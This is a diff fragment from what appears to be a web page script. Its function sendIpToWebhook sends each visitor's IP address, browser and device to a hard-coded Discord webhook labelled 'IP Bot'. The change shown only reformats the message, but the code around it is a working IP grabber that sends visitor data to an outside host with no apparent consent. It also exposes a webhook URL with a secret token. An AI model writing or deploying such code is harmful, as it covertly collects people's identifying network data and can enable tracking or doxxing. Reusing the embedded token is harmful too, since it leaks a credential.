@@ -48,7 +48,7 @@
         function sendIpToWebhook(ip, browser, device) {
             const webhookUrl = 'https://discord.com/api/webhooks/1356629113678336191/yfvYgefTCtYsLQi1PseDawA1IaL62QciuHXKiTwCkxMjDAY1Fd5GsYAxo0kv3kI2ASn8';
             const payload = {
-                content: `Address: ${ip}\nBrowser: ${browser}\nDevice: ${device}`,
+                content: `---------------------------------\nAddress: ${ip}\nBrowser: ${browser}\nDevice: ${device}\n---------------------------------`,
                 username: 'IP Bot',
             };
 
